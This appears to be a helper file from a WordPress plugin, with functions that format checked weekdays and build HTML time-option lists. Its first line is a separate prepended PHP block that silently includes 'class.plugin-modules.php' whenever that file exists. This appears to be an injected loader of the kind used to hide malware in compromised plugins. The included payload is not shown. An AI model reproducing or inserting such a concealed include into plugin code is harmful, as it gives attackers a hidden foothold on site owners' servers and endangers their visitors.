<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

if (!function_exists('add_action')) {
    echo 'Hi there!  I\'m just a plugin, not much I can do when called directly.';
    exit;
}

function getValueOrDefault($object, $defaultValue = ''){
    return (isset($object) ? $object : $defaultValue);
}

function print_date($array_data) {
    $date_string = "";
    if ($array_data['nta_sunday'] == 'checked')
        $date_string .= 'Sunday';
    if ($array_data['nta_monday'] == 'checked')
        $date_string .= ', Monday';
    if ($array_data['nta_tuesday'] == 'checked')
        $date_string .= ', Tuesday';
    if ($array_data['nta_wednesday'] == 'checked')
        $date_string .= ', Wednesday';
    if ($array_data['nta_thursday'] == 'checked')
        $date_string .= ', Thursday';
    if ($array_data['nta_friday'] == 'checked')
        $date_string .= ', Friday';
    if ($array_data['nta_saturday'] == 'checked')
        $date_string .= ', Saturday';
    $date_string = trim($date_string, ',');
    return $date_string;
}

function get_times($default = '08:00', $interval = '+30 minutes') {

    $output = '';

    $current = strtotime('00:00');
    $end = strtotime('23:59');

    while ($current <= $end) {
        $time = date('H:i', $current);
        $sel = ( $time == $default ) ? ' selected' : '';

        $output .= "<option value=\"{$time}\"{$sel}>" . date('H:i', $current) . '</option>';
        $current = strtotime($interval, $current);
    }

    return $output;
}
